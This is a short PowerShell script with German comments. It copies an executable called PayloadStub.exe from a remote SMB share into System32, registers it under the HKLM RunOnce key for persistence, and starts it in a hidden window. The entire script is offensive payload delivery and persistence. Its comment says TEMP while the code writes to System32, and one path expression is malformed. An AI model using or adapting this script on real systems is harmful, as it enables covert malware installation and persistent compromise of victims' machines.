# PowerShell: SMB-Payload in TEMP kopieren und lokal ausführen
$src = "\\192.168.178.100\share\PayloadStub.exe"
$dst = "$env:C:\Windows\System32\PayloadStub.exe"

Write-Host "[*] Kopiere Payload von SMB-Share nach TEMP..." -ForegroundColor Cyan
Copy-Item $src $dst -Force
# Setzt RunOnce-Eintrag für PayloadStub.exe
$path = "C:\Windows\System32\PayloadStub.exe"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "81a5_payload" -Value $path
Write-Host "[+] RunOnce-Eintrag gesetzt: $path"

Write-Host "[*] Starte Payload lokal von $dst ..." -ForegroundColor Green
Start-Process $dst -WindowStyle Hidden
